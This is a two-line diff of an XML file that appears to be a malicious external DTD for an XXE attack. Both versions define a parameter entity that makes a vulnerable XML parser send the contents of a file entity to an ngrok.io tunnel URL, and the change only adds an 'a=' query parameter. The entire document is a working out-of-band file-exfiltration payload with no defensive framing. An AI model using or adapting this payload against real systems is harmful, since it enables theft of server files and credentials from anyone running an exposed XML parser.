@@ -1,2 +1,2 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://6439-2001-b07-645a-f9d8-f98d-9338-ff91-b8f4.ngrok.io/?%file;'>"> %all;
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://6439-2001-b07-645a-f9d8-f98d-9338-ff91-b8f4.ngrok.io/?a=%file;'>"> %all;
